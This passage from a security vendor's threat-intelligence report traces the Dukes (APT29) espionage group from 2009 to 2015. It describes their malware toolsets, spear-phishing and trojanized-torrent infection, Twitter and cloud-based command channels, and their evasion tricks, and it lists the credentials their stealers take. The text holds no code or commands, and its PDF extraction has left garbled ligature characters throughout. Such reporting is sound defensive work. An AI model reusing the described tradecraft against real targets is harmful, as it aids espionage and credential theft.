2008 suggests to us that either the size of their cyberespionage operation was already large enough to warrant such an arsenal of tools, or that they expected their operation to grow signi˜cantly enough in the foreseeable future to warrant the development of such an arsenal. We examine each of the Duke toolsets in greater detail later in the Tools and Techniques section (page 16). The story of the Dukes, as it is currently known, begins with a malware toolset that we call PinchDuke. This toolset consists of multiple loaders and an information-stealer trojan. Importantly, PinchDuke trojan samples always contain a notable text string, which we believe is used as a campaign identi˛er by the Dukes group to distinguish between multiple attack campaigns that are run in parallel. These campaign identi˛ers, which frequently specify both the date and target of the campaign, provide us with a tantalizing view into the early days of the Dukes. Etymology: a note on names The origins of the Duke toolset names can be traced back to when researchers at Kaspersky Labs coined the term ﬁMiniDukeﬂ to identify the ˛rst Duke-related malware they found. As explained in their whitepaper 7 , the researchers observed the surprisingly small MiniDuke backdoor being spread via the same exploit that was being used by a malware that they had already named ItaDuke; the ﬁDukeﬂ part of this malware™s name had in turn come about because it reminded the researchers of the notable Duqu threat. Despite the shared history of the name itself however, it is important to note that there is no reason to believe that the Duke toolsets themselves are in any way related to the ItaDuke malware, or to Duqu for that matter. As researchers continued discovering new toolsets that were created and used by the same group that had been operating MiniDuke, the new toolsets were also given ﬁDukeﬂ-derived names, and thus the threat actor operating the toolsets started to be commonly referred to as ﬁthe Dukesﬂ. The only other publicly used name for the threat actor that we are aware of is ﬁAPT29ﬂ 22 . Some exceptions to this naming convention do exist, and in the case of speci˛c Duke toolsets, other commonly used names are listed in the Tools and Techniques section (page 16). ItaDuke DuquMiniDuke PinchDuke CosmicDuke OnionDuke CozyDuke CloudDuke SeaDuke HammerDuke GeminiDuke ﬁdukeﬂ ﬁdukeﬂ The Dukes 52009: First known campaigns against the West Based on the campaign identi˜ers found in PinchDuke samples discovered from 2009, the targets of the Dukes group during that year included organizations such as the Ministry of Defense of Georgia and the ministries of foreign a˚airs of Turkey and Uganda. Campaign identi˜ers from 2009 also reveal that by that time, the Dukes were already actively interested in political matters related to the United States (US) and the North Atlantic Treaty Organization (NATO), as they ran campaigns targeting (among other organizations) a US-based foreign policy think tank, another set of campaigns related to a NATO exercise held in Europe, and a third set apparently targeting what was then known as the Georgian ﬁInformation Centre on NATOﬂ. Of these campaigns, two clusters in particular stand out. The ˜rst is a set of campaigns from the 16 th and 17th of April, 2009, that targeted a US-based foreign policy think tank, as well as government institutions in Poland and the Czech Republic (image 1, below). These campaigns utilized specially-crafted malicious Microsoft Word documents and PDF ˜les, which were sent as e-mail attachments to various personnel in an attempt to in˜ltrate the targeted organizations. We believe this cluster of campaigns had a joint goal of gathering intelligence on the sentiments of the targeted countries with respect to the plans being discussed at the time for the US to locate their ﬁEuropean Interceptor Siteﬂ missile defense base in Poland, with a related radar station that was intended to be located in the Czech Republic. Regarding the timing of these campaigns, it is curious to note that they began only 11 days after President Barack Obama gave a speech on the 5 th of April declaring his intention to proceed with the deployment of these missile defenses 1.The second notable cluster comprises of two campaigns that were possibly aimed at gathering information on Georgia-NATO relations. The ˜rst of these runs used the campaign identi˜er ﬁ natoinfo_ge ﬂ, an apparent reference to the www.natoinfo.ge website belonging to a Georgian political body that has since been renamed ﬁInformation Centre on NATO and EUﬂ. Although the campaign identi˜er itself doesn™t contain a date, we believe the campaign to have originated around the 7 th of June 2009, which was when the PinchDuke sample in question was compiled. This belief is based on the observation that in all of the other PinchDuke samples we have analyzed, the date of the campaign identi˜er has been within a day of the compilation date. The second campaign identi˜er, which we suspect may be related, is ﬁmod_ge_2009_07_03 ﬂ from a month later and apparently targeting the Ministry of Defense of Georgia.

The contents appear to have been copied from a BBC news article 3IMAGE 1: EARLY ACTIVITY FROM 2008 & 2009 62010: The emergence of CosmicDuke in the Caucasus The spring of 2010 saw continued PinchDuke campaigns against Turkey and Georgia, but also numerous campaigns against other members of the Commonwealth of Independent States such as Kazakhstan, Kyrgyzstan, Azerbaijan and Uzbekistan. Of these, the campaign with the identi˜er ﬁkaz_2010_07_30 ﬂ, which possibly targeted Kazakhstan, is of note because it is the last PinchDuke campaign we have observed. We believe that during the ˜rst half of 2010, the Dukes slowly migrated from PinchDuke and started using a new infostealer malware toolset that we call CosmicDuke .The ˜rst known sample of the CosmicDuke toolset was compiled on the 16 th of January 2010. Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples. We believe that during the spring of 2010, the credential and ˜le stealing capabilities of PinchDuke were slowly ported to CosmicDuke , e˚ectively making PinchDuke obsolete. During this period of transition, CosmicDuke would often embed PinchDuke so that, upon execution, CosmicDuke would write to disk and execute PinchDuke . Both PinchDuke and CosmicDuke would then operate independently on the same compromised host, including performing separate information gathering, data ex˜ltration and communication with a command and control (C&C) server - although both malware would often use the same C&C server. We believe the purpose of this parallel use was to ‚˜eldtest™ the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke .During this period of CosmicDuke testing and development, the Duke authors also started experimenting with the use of privilege escalation vulnerabilities. Speci˜cally, on the 19 th of January 2010 security researcher Tavis Ormandy disclosed a local privilege escalation vulnerability (CVE-2010-0232) a˚ecting Microsoft Windows. As part of the disclosure, Ormandy also included the source code for a proof-of- concept exploit for the vulnerability 4 . Just 7 days later, on the 26th of January, a component for CosmicDuke was compiled that exploited the vulnerability and allowed the tool to operate with higher privileges. One loader to load them all (almost) In addition to all the other components being produced by the Dukes group, in 2010 they were also actively developing and testing a new loader - a component that wraps the core malware code and provides an additional layer of obfuscation. The ˛rst sample of this loader was compiled on the 26th of July 2010, making it a direct predecessor of what has since become known as the ﬁMiniDuke loaderﬂ, as later versions were extensively used by both MiniDuke and CosmicDuke. Some hints about the history of the ﬁMiniDuke loaderﬂ were noted in the CosmicDuke whitepaper we published 5 in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. In fact, we now know that before being used with either, the ﬁMiniDuke loaderﬂ was used to load PinchDuke. The ˛rst known sample of the loader was used during the summer of 2010, while the most recent samples were seen during the spring of 2015. This neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three di˝erent Dukes-related toolsets Œ CosmicDuke, PinchDuke, and MiniDuke Œ over the course of ˛ve years. 72011: John Kasai of Klagenfurt, Austria During 2011, the Dukes appear to have signi˜cantly expanded both their arsenal of malware toolsets and their C&C infrastructure. While the Dukes employed both hacked websites and purposely rented servers for their C&C infrastructure, the group rarely registered their own domain names, preferring instead to connect to their self- operated servers via IP addresses. The beginning of 2011 however saw a signi˜cant break from that routine, when a large grouping of domain names was registered by the Dukes in two batches; the ˜rst batch was registered on the 29 th of January and the second on the 13 th of February. All the domains in both batches were initially registered with the same alias: ﬁJohn Kasai of Klagenfurt, Austriaﬂ (image 2, above). These domains were used by the Dukes in campaigns involving many of their di˚erent malware toolsets all the way until 2014. Like the ﬁMiniDuke loaderﬂ, these ﬁJohn Kasaiﬂ domains also provide a common thread tying together much of the tools and infrastructure of the Dukes. 2011: Continuing expansion of the Dukes arsenal By 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. In fact, as a sign of their arsenal™s breadth, they had already decided to retire one of these malware toolsets as obsolete after developing a replacement for it, seemingly from scratch. The Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke . While all of the earlier toolsets Œ GeminiDuke , PinchDuke , and CosmicDuke Œ were designed around a core infostealer component, MiniDuke is centered on a simplistic backdoor component whose purpose is to enable the remote execution of commands on the compromised system. The ˜rst observed samples of the MiniDuke backdoor component are from May 2011. This backdoor component however is technically very closely related to GeminiDuke , to the extent that we believe them to share parts of their source code. The origins of MiniDuke can thus be traced back to the origins of GeminiDuke , of which the earliest observed sample was compiled in January of 2009. Unlike the simplistic MiniDuke toolset, CozyDuke is a highly versatile, modular, malware ﬁplatformﬂ whose functionality lies not in a single core component but in an array of modules that it may be instructed to download from its C&C server. These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. CozyDuke™s modular platform approach is a clear break from the designs of the previous Duke toolsets. The stylistic di˚erences between CozyDuke and its older siblings are further exempli˜ed by the way it was coded. All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language. CozyDuke however represents the complete opposite. Instead of being written in Assembly or C, it was written in C++ , which provides added layers of abstraction for the developer™s perusal, at the cost of added complexity. Contrary to what might be expected from malware, early CozyDuke versions also lacked any attempt at obfuscating or hiding their true nature. In fact, they were extremely open and verbose about their functionality - for example, early samples contained a plethora of logging messages in unencrypted form. In comparison, even the earliest known GeminiDuke samples encrypted any strings that might have given away the malware™s true nature. Finally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware. For instance, the earliest known CozyDuke version utilized a feature of the Microsoft Visual C++ compiler known as run-time error checking . This feature added automatic error checking to critical parts of the program™s execution at the cost, from a malware perspective, of providing additional hints that make the malware™s functionality easier for reverse engineers to understand. IMAGE 2: COMPARING WHOIS REGISTRATION DETAILS Left - Original whois registration details for natureinhome.com, one of the Duke C&C server domains registered on the 29th of January, 2011 to ﬁJohn Kasaiﬂ Right - Details for the domain were later changed, providing a small glimpse of the Dukes™ sense of humor 8Based on these and other similar stylistic di˚erences observed between CozyDuke and its older siblings, we speculate that while the older Duke families appear to be the work of someone with a background in malware writing (or at the least in hacking), CozyDuke ™s author or authors more likely came from a software development background. 2012: Hiding in the shadows We still know surprisingly few speci˜cs about the Dukes group™s activities during 2012. Based on samples of Duke malware from 2012, the Dukes do appear to have continued actively using and developing all of their tools. Of these, CosmicDuke and MiniDuke appear to have been in more active use, while receiving only minor updates. GeminiDuke and CozyDuke on the other hand appear to have been less used in actual operations, but did undergo much more signi˜cant development. 2013: MiniDuke ˚ies too close to the sunOn the 12th of February 2013, FireEye published a blogpost 6 alerting readers to a combination of new Adobe Reader 0-day vulnerabilities, CVE-2013-0640 and CVE-2013-0641, that were being actively exploited in the wild. 8 days after FireEye™s initial alert, Kaspersky spotted the same exploit being used to spread an entirely di˚erent malware family from the one mentioned in the original report. On 27 th February, Kaspersky 7 and CrySyS 8 Lab published research on this previously unidenti˜ed malware family, dubbing it MiniDuke . As we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. Their malware had not stayed undetected for those 4 and a half years. In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews. Until 2013 however, earlier Duke toolsets had not been put in a proper context. That ˜nally started to change in 2013. The MiniDuke samples that were spread using these exploits were compiled on the 20 th of February, after the exploit was already publicly known. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them. We however do not believe so. As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small di˚erences. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. These strings, which are generated by the compiler when using speci˜c compilation settings, means that the components of the exploits used with MiniDuke had to have been compiled independently from those described by FireEye. We do not know whether the Dukes compiled the components themselves or whether someone else compiled the components before handing them to the group. This does however still rule out the possibility that the Dukes simply obtained copies of the exploit binaries described by FireEye and repurposed them. In our opinion, this insistence on using exploits that are already under heightened scrutiny suggests the existence of at least one of three circumstances. Firstly, the Dukes may have been con˜dent enough in their own abilities (and in the slowness of their opponents to react to new threats) that they did not care if their targets may already be on the lookout for anyone exploiting these vulnerabilities. Secondly, the value the Dukes intended to gain from these MiniDuke campaigns may have been so great that they deemed it worth the risk of getting noticed. Or thirdly, the Dukes may have invested so much into these campaigns that by the time FireEye published their alert, the Dukes felt they could not a˚ord to halt the campaigns. We believe all three circumstances to have coexisted at least to some extent. As will become evident in this report, this was not a one-o˚ case but a recurring theme with the Dukes, in that they would rather continue with their operations as planned than retreat from operating under the spotlight. IMAGE 3: MINIDUKE DECOY One of the Ukraine-themed decoy documents used during a MiniDuke campaign in February 2013 9As originally detailed in Kaspersky™s whitepaper, the MiniDuke campaigns from February 2013 employed spear-phishing emails with malicious PDF ˜le attachments. These PDFs would attempt to silently infect the recipient with MiniDuke, while distracting them by displaying a decoy document. The headings of these documents included ﬁUkraine™s NATO Membership Action Plan (MAP) Debatesﬂ, ﬁThe Informal Asia-Europe Meeting (ASEM) Seminar on Human Rightsﬂ, and ﬁUkraine™s Search for a Regional Foreign Policyﬂ (image 3, page 8). The targets of these campaigns, according to Kaspersky, were located variously in Belgium, Hungary, Luxembourg and Spain 7 . Kaspersky goes on to state that by obtaining log ˜les from the MiniDuke command and control servers, they were able to identify high-pro˜le victims from Ukraine, Belgium, Portugal, Romania, the Czech Republic, Ireland, the United States and Hungary 7 .2013: The curious case of OnionDuke After the February campaigns, MiniDuke activity appeared to quiet down, although it did not fully stop, for the rest of 2013. The Dukes group as a whole however showed no sign of slowing down. In fact, we saw yet another Duke malware toolset, OnionDuke , appear ˜rst in 2013. Like CozyDuke , OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. The OnionDuke toolset includes various modules for purposes such as password stealing, information gathering, denial of service (DoS) attacks, and even posting spam to the Russian social media network, VKontakte. The OnionDuke toolset also includes a dropper, an information stealer variant and multiple distinct versions of the core component that is responsible for interacting with the various modules. What makes OnionDuke especially curious is an infection vector it began using during the summer of 2013. To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent ˜les containing these trojanized applications, then uploaded them to websites hosting torrent ˜les (image 4, above). Victims who used the torrent ˜les to download the applications would end up getting infected with OnionDuke .For most of the OnionDuke components we observed, the ˜rst versions that we are aware of were compiled during the summer of 2013, suggesting that this was a period of active development around this toolset. Critically however, the ˜rst sample of the OnionDuke dropper, which we have observed being used only with components of this toolset, was compiled on the 17 th of February 2013. This is signi˜cant because it suggests that OnionDuke was under development before any part of the Duke operation became public. OnionDuke™s development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets. This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both signi˜cant resources and capacity. 2013: The Dukes and Ukraine In 2013, many of the decoy documents employed by the Dukes in their campaigns were related to Ukraine; examples include a letter undersigned by the First Deputy Minister for Foreign A˚airs of Ukraine, a letter from the embassy of the Netherlands in Ukraine to the Ukrainian Ministry of Foreign a˚airs and a document titled ﬁUkraine™s Search for a Regional Foreign Policyﬂ. 9These decoy documents however were written before the start of the November 2013 Euromaidan protests in Ukraine and the subsequent upheaval. It is therefore important to note that, contrary to what might be assumed, we have actually observed a drop instead of an increase in Ukraine-related campaigns from the Dukes following the country™s political crisis. This is in stark contrast to some other suspected Russian threat actors (such as Operation Pawn Storm 10) who appear to have increased their targeting of Ukraine following the crisis. This supports our analysis that the overarching theme in the Dukes™ targeting is the collection of intelligence to support diplomatic e˚orts. The Dukes actively targeted Ukraine before the crisis, at a time when Russia was still weighing her options, but once Russia moved from diplomacy to direct action, Ukraine was no longer relevant to the Dukes in the same way. IMAGE 4: ONIONDUKE˙TROJANIZED TORRENT FILE Example of a torrent ˜le containing an executable trojanized with the OnionDuke toolset 102013: CosmicDuke™s war on drugs In a surprising turn of events, in September 2013 a CosmicDuke campaign was observed targeting Russian speakers involved in the trade of illegal and controlled substances (image 5, above). Kaspersky Labs, who sometimes refer to CosmicDuke as ‚Bot Gen Studio™, speculated that ﬁone possibility is that ‚Bot Gen Studio™ is a malware platform also available as a so-called ‚legal spyware™ toolﬂ; therefore, those using CosmicDuke to target drug dealers and those targeting governments are two separate entities 11. We however feel it is unlikely that the CosmicDuke operators targeting drug dealers and those targeting governments could be two entirely independent entities. A shared supplier of malware would explain the overlap in tools, but it would not explain the signi˜cant overlap we have also observed in operational techniques related to command and control infrastructure. Instead, we feel the targeting of drug dealers was a new task for a subset of the Dukes group, possibly due to the drug trade™s relevance to security policy issues. We also believe the tasking to have been temporary, because we have not observed any further similar targeting from the Dukes after the spring of 2014. 2014: MiniDuke™s rise from the ashes While MiniDuke activity decreased signi˜cantly during the rest of 2013 following the attention it garnered from researchers, the beginning of 2014 saw the toolset back in full force. All MiniDuke components, from the loader and downloader to the backdoor, had been slightly updated and modi˜ed during the downtime. Interestingly, the nature of these modi˜cations suggests that their primary purpose was to regain the element of stealth and undetectability that had been lost almost a year earlier. Of these modi˜cations, arguably the most important were the ones done to the loader. These resulted in a loader version that would later become known as the ﬁNemesis Gemina loaderﬂ due to PDB strings found in many of the samples. It is however still only an iteration on earlier versions of the MiniDuke loader. The ˜rst observed samples of the Nemesis Gemina loader (compiled on 14 th December 2013) were used to load the updated MiniDuke backdoor, but by the spring of 2014 the Nemesis Gemina loader was also observed in use with CosmicDuke .2014: CosmicDuke™s moment of fame and the scramble that ensued Following the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2 nd July 2014 5. The next day, Kaspersky also published their own research on the malware 11. It should be noted that until this point, even though CosmicDuke had been in active use for over 4 years, and had undergone minor modi˜cations and updates during that time, even the most recent CosmicDuke samples would often embed persistence components that date back to 2012. These samples would also contain artefacts of functionality from the earliest CosmicDuke samples from 2010. It is therefore valuable to observe how the Dukes reacted to CosmicDuke™s outing at the beginning of July. By the end of that month, CosmicDuke samples we found that had been compiled on the 30 th of July had shed unused parts of their code that had essentially just been relics of the past. Similarly, some of the hardcoded values that had remained unaltered in CosmicDuke samples for many years had been changed. We believe these edits were an attempt at evading detection by modifying or removing parts of the toolset that the authors believed might be helpful in identifying and detecting it. Concurrently with the alterations to CosmicDuke , the Dukes were also hard at work modifying their trusted loader. Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the ˜rst known samples from 2010. Again, much of the modi˜cation work focused on removing redundant code in an attempt to appear di˚erent from earlier versions of the loader. Interestingly however, another apparent evasion trick was also attempted - forging of the loaders™ compilation timestamps. IMAGE 5: COSMICDUKE DECOY Screenshot of a decoy document appearing to be an order for growth hormones, which was used in a CosmicDuke campaign in September 2013 11The ˜rst CosmicDuke sample we observed after the initial research on CosmicDuke was a sample compiled on the 30th of July 2014. The loader used by the sample purported to have been compiled on the 25 th of March 2010. Due to artefacts left in the loader during compilation time however, we know that it used a speci˜c version of the Boost library, 1.54.0, that was only published on the 1 st of July 2013 12. The compilation timestamp therefore had to have been faked. F-Secure™s whitepaper 5 on CosmicDuke includes a timeline of the loader™s usage, based on compilation timestamps. Perhaps the Dukes group thought that by faking a timestamp from before the earliest one cited in the whitepaper, they might be able to confuse researchers. During the rest of 2014 and the spring of 2015, the Dukes continued making similar evasion-focused modi˜cations to CosmicDuke , as well as experimenting with ways to obfuscate the loader. In the latter case however, the group appear to have also simultaneously developed an entirely new loader, which we ˜rst observed being used in conjunction with CosmicDuke during the spring of 2015. While it is not surprising that the Dukes reacted to multiple companies publishing extensive reports on one of their key toolsets, it is valuable to note the manner in which they responded. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. Instead, they opted for minimal downtime and attempted to continue operations, with only minor modi˜cations to the toolset. 2014: CozyDuke and monkey videos While we now know that CozyDuke had been under development since at least the end of 2011, it was not until the early days of July 2014 that the ˜rst large-scale CozyDuke campaign that we are aware of took place. This campaign, like later CozyDuke campaigns, began with spear-phishing emails that tried to impersonate commonly seen spam emails. These spear-phishing emails would contain links that eventually lead the victim to becoming infected with CozyDuke .Some of the CozyDuke spear-phishing emails from early July posed as e-fax arrival noti˜cations, a popular theme for spam emails, and used the same ﬁUS letter fax test pageﬂ decoy document that was used a year later by CloudDuke . In at least one case however, the email instead contained a link to a zip-archive ˜le named ﬁO˛ce Monkeys LOL Video.zipﬂ, which was hosted on the DropBox cloud storage service. What made this particular case interesting was that instead of the usual dull PDF ˜le, the decoy was a Flash video ˜le, more speci˜cally a Super Bowl advertisement from 2007 purporting to show monkeys at an o˛ce (image 6, above). 2014: OnionDuke gets caught using a malicious Tor node On the 23 rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found. They noted that this node appeared to be maliciously modifying any executables that were downloaded through it over a HTTP connection. Executing the modi˜ed applications obtained this way would result in the victim being infected with unidenti˜ed malware. On the 14 th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke , the other Duke toolsets known at the time 13.Based on our investigations into OnionDuke , we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identi˜ed by the researchers was being used to wrap executables on-the-˝y with OnionDuke (image 7, page 13). This is similar to the way in which the toolset was being spread via trojanized applications in torrent ˜les during the summer of 2013. While investigating the OnionDuke variant being spread by the malicious Tor node, we also identi˜ed another OnionDuke variant that appeared to have successfully compromised multiple victims in the ministry of foreign a˚airs of an Eastern European country during the spring of 2014. This variant di˚ered signi˜cantly in functionality from the one being spread via the Tor node, further suggesting that di˚erent OnionDuke variants are intended for di˚erent kinds of victims. IMAGE 6: COZYDUKE DECOYS Left - US letter fax test decoy used in CozyDuke campaigns Right - Screenshot of the monkey video decoy also used by CozyDuke 12We believe that, unusually, the purpose of the OnionDuke variant spread via the Tor node was not to pursue targeted attacks but instead to form a small botnet for later use. This OnionDuke variant is related to the one seen during the summer of 2013 being spread via torrent ˜les. Both of these infection vectors are highly indiscriminate and untargeted when compared to spear-phishing, the usual infection vector of choice for the Dukes. Further, the functionality of the OnionDuke variant is derived from a number of modules. While one of these modules gathers system information and another attempts to steal the victim™s usernames and passwords, as one would expect from a malware used for a targeted attack, the other two known OnionDuke modules are quite the opposite; one is designed for use in DoS attacks and the other for posting predetermined messages to the Russian VKontakte social media site. This sort of functionality is more common in criminality-oriented botnets, not state-sponsored targeted attacks. We have since been able to identify at least two separate OnionDuke botnets. We believe the formation of the ˜rst of these botnets began in January 2014, using both unidenti˜ed infection vectors and the known malicious Tor node, and continued until our blogpost was published in November. We believe the formation of the second botnet began in August 2014 and continued until January 2015. We have been unable to identify the infection vectors used for this second botnet, but the C&C servers it used had open directory listings, allowing us to retrieve ˜les containing listings of victim IP addresses. The geographic distribution of these IP addresses (image 8, page 13) further supports our theory that the purpose of this OnionDuke variant was not targeted attacks against high-pro˜le targets. One theory is that the botnets were a criminal side business for the Dukes group. The size of the botnet however (about 1400 bots) is very small if its intended use is for commercial DoS attacks or spam-sending. Alternatively, OnionDuke also steals user credentials from its victims, providing another potential revenue source. The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets. 2015: The Dukes up the ante The end of January 2015 saw the start of the most high- volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke . Curiously, the spear-phishing emails were strikingly similar to the e-fax themed spam usually seen spreading ransomware and other common crimeware. Due to the sheer number of recipients, it may not have been possible to customize the emails in the same way as was possible with lower-volume campaigns. The similarity to common spam may however also serve a more devious purpose. It is easy to imagine a security analyst, burdened by the amount of attacks against their network, dismissing such common-looking spam as ﬁjust another crimeware spam runﬂ, allowing the campaign to, in essence, hide in the masses 14 . The CozyDuke activity continues one of the long-running trends of the Dukes operations, the use of multiple malware toolsets against a single target. In this case, the Dukes ˜rst attempted to infect large numbers of potential targets with CozyDuke (and in a more obvious manner than previously seen). They would then use the toolset to gather initial information on the victims, before deciding which ones to pursue further. For the victims deemed interesting enough, the Dukes would then deploy a di˚erent toolset. We believe the primary purpose of this tactic is an attempt at evading detection in the targeted network. Even if the noisy initial CozyDuke campaign is noticed by the victim organization, or by someone else who then makes it publicly known, defenders will begin by ˜rst looking for indicators of compromise (IOCs) related to the CozyDuke toolset. If however by that time the Dukes are already operating within the victim™s network, using an another toolset with di˚erent IOCs, then it is reasonable to assume that it will take much longer for the victim organization to notice the in˜ltration. In previous cases, the group used their malware toolsets interchangeably, as either the initial or a later-stage toolset in a campaign. For these CozyDuke campaigns however, the Dukes appear to have employed two particular later-stage toolsets, SeaDuke and HammerDuke , that were purposely designed to leave a persistent backdoor on the compromised network. HammerDuke is a set of backdoors that was ˜rst seen in the wild in February 2015, while SeaDuke is a cross- platform backdoor that was, according to Symantec, ˜rst spotted in the wild in October 2014 15. Both toolsets were originally spotted being deployed by CozyDuke to its victims. What makes SeaDuke special is that it was written in Python and designed to work on both Windows and Linux systems; it is the ˜rst cross-platform tool we have seen from the Dukes. One plausible reason for developing such a ˝exible malware might be that the group were increasingly encountering victim environments where users were using Linux as their desktop operating system. Meanwhile, HammerDuke is a Windows-only malware (written in .NET) and comes in two variants. The simpler one will connect to a hardcoded C&C server over HTTP or HTTPS to download commands to execute. The more advanced variant, on the other hand, will use an algorithm to generate a periodically-changing Twitter account name and will then attempt to ˜nd tweets from that 13284 21% MONGOLIA 326 23% INDIA 260 19% OTHER 235 17% UNKNOWN 100 7%PAKISTAN 64 5%ALGERIA 58 4%MOROCCO 62 4%EGYPT , 43TURKEY , 38USA , 39INDONESIA , 34SAUDI ARABIA , 25 BRAZIL , 22 PHILIPPINES , 16SRI LANKA , 15BANGLADESH , 14 NEPAL , 13CAMBODIA , 13CHINA, 123% EACH 2% EACH 1% EACH IMAGE 8: GEOGRAPHICAL DISTRIBUTION OF ONIONDUKE BOTNET TOTAL: 1389 ONIONDUKE DROPPER ONIONDUKE CORE COMPONENT ONIONDUKE DROPPER ONIONDUKE CORE COMPONENT ONIONDUKE CORE COMPONENT Drops Drops Drops Original binary Original binary Original binary Executes MALICIOUS TOR EXIT NODEVICTIM Request Response Wrapped binary IMAGE 7: FLOWCHART OF HOW ONIONDUKE USES MALICIOUS TOR NODE TO INFECT VICTIMS 14account containing links to the actual download location of the commands to execute. In this way, the advanced HammerDuke variant attempts to hide its network tra˛c in more legitimate use of Twitter. This method is not unique to HammerDuke , as MiniDuke , OnionDuke , and CozyDuke all support similar use of Twitter (image 9, above) to retrieve links to additional payloads or commands.2015: CloudDuke In the beginning of July 2015, the Dukes embarked on yet another large-scale phishing campaign. The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the ˜rst time that this toolset was deployed by the Dukes, other than possible small-scale testing. The CloudDuke toolset consists of at least a loader, a downloader, and two backdoor variants. Both backdoors (internally referred to by their authors as ﬁBastionSolutionﬂ and ﬁOneDriveSolutionﬂ) essentially allow the operator to remotely execute commands on the compromised machine. The way in which each backdoor does so however is signi˜cantly di˚erent. While the BastionSolution variant simply retrieves commands from a hard-coded C&C server controlled by the Dukes, the OneDriveSolution utilizes Microsoft™s OneDrive cloud storage service for communicating with its masters, making it signi˜cantly harder for defenders to notice the tra˛c and block the communication channel. What is most signi˜cant about the July 2015 CloudDuke campaign is the timeline. The campaign appeared to consist of two distinct waves of spear-phishing, one during the ˜rst days of July and the other starting from the 20 th of the month. Details of the ˜rst wave, including a thorough technical analysis of CloudDuke , was published by Palo Alto Networks on 14 th July 16. This was followed by additional details from Kaspersky in a blog post published on 16 th July 17.Both publications happened before the second wave took place and received notable publicity. Despite the attention and public exposure of the toolset™s technical details (including IOCs) to defenders, the Dukes still continued with their second wave of spear-phishing, including the continued use of CloudDuke . The group did change the contents of the spear-phishing emails they sent, but they didn™t switch to a new email format; instead, they reverted to the same efax-themed format that they had previously employed, even to the point of reusing the exact same decoy document that they had used in the CozyDuke campaign a year earlier (July 2014). This once more highlights two crucial behavioral elements of the Dukes group. Firstly, as with the MiniDuke campaigns of February 2013 and CosmicDuke campaigns in the summer of 2014, again the group clearly prioritized the continuation of their operations over maintaining stealth. Secondly, it underlines their boldness, arrogance and self-con˜dence; they are clearly con˜dent in both their ability to compromise their targets even when their tools and techniques are already publicly known, and critically, they appear to be extremely con˜dent in their ability to act with impunity. 2015: Continuing surgical strikes with CosmicDuke In addition to the notably overt and large-scale campaigns with CozyDuke and CloudDuke , the Dukes also continued to engage in more covert, surgical campaigns using CosmicDuke . The latest of these campaigns that we are aware of occurred during the spring and early summer of 2015. As their infection vectors, these campaigns used malicious documents exploiting recently ˜xed vulnerabilities. Two of these campaigns were detailed in separate blog posts by the Polish security company Prevenity, who said that both campaigns targeted Polish entities with spear- phishing emails containing malicious attachments with relevant Polish language names 18 19 . A third, similar, CosmicDuke campaign was observed presumably targeting Georgian entities since it used an attachment with a Georgian-language name that translates to ﬁNATO consolidates control of the Black Sea.docxﬂ. Based on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. Instead, we believe that they are simply expanding their activities by adding new tools and techniques.

The loaders associated with the PinchDuke toolset have also been observed being used with CosmicDuke. The PinchDuke information stealer gathers system con˛guration information, steals user credentials, and collects user ˛les from the compromised host transferring these via HTTP(S) to a C&C server. We believe PinchDuke™s credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums. Credentials targeted by PinchDuke include ones associated with the following software or services: The Bat! Yahoo! Mail.ru Passport.Net Google Talk Netscape Navigator Mozilla Firefox Mozilla Thunderbird Internet Explorer Microsoft Outlook WinInet Credential Cache Lightweight Directory Access Protocol (LDAP) PinchDuke will also search for ˛les that have been created within a prede˛ned timeframe and whose ˛le extension is present in a prede˛ned list. TOOLS AND TECHNIQUES OF THE DUKES PINCHDUKE 17First known activity: January 2009 Most recent known activity: December 2012 Other names: N/A C&C communication methods: HTTP (S) Known toolset components: ˆ Loader ˆ Information stealer ˆ Multiple persistence components The GeminiDuke toolset consists of a core information stealer, a loader and multiple persistence-related components. Unlike CosmicDuke and PinchDuke, GeminiDuke primarily collects information on the victim computer™s con˛guration. The collected details include: Local user accounts Network settings Internet proxy settings Installed drivers Running processes Programs previously executed by users Programs and services con˛gured to automatically run at startup Values of environment variables Files and folders present in any users home folder Files and folders present in any users My Documents Programs installed to the Program Files folder Recently accessed ˛les, folders and programs As is common for malware, the GeminiDuke infostealer uses a mutex to ensure that only one instance of itself is running at a time. What is less common is that the name used for the mutex is often a timestamp. We believe these timestamps to be generated during 